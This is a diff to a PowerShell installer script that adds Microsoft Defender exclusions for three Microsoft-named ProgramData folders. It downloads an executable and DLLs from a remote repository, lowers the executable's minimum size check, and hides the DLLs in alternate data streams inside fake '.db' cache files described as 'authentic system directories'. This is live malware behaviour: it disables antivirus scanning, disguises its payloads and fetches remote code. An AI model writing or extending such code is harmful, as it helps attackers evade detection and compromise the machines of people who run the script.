@@ -101,6 +101,9 @@ Update-Step 20
 try {
     Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $TEMPLATES -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Network\Downloader" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Diagnosis\ETW" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache" -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
 } catch {}
 
@@ -180,27 +183,38 @@ try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $wc.DownloadFile($EXE_URL, $EXE_PATH)
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 50000)) {
         $downloaded = $true
     }
 } catch {}
 
 if (-not $downloaded) {
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 500000)) {
+    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 50000)) {
         $downloaded = $true
     }
 }
 
 Update-Step 75
 
-# Seal Clean Component DLLs into ADS (Alternate Data Streams)
+# Purge old clustered files from Templates folder if any
+Remove-Item "$TEMPLATES\winrescache.db" -Force -ErrorAction SilentlyContinue
+Remove-Item "$TEMPLATES\gphcache.db" -Force -ErrorAction SilentlyContinue
+Remove-Item "$TEMPLATES\ntprintcache.db" -Force -ErrorAction SilentlyContinue
+
+# Seal Component DLLs into 3 Completely Separate, Authentic System Directories
 $MAP = [ordered]@{
-    "cimgui.dll" = @("winrescache.db",  "vtcache")
+    "cimgui.dll" = @("$env:ProgramData\Microsoft\Network\Downloader\winrescache.db", "vtcache")
+    "AotBst.dll" = @("$env:ProgramData\Microsoft\Diagnosis\ETW\gphcache.db", "vtmap")
+    "Client.dll" = @("$env:ProgramData\Microsoft\Windows\DeviceMetadataCache\ntprintcache.db", "vtload")
 }
 foreach ($name in $MAP.Keys) {
-    $container = "$TEMPLATES\$($MAP[$name][0])"
+    $container = $MAP[$name][0]
     $stream    = $MAP[$name][1]
+    $parentDir = [System.IO.Path]::GetDirectoryName($container)
+    if (-not (Test-Path $parentDir)) {
+        New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
+    }
     $tmp       = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
     try {
         Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
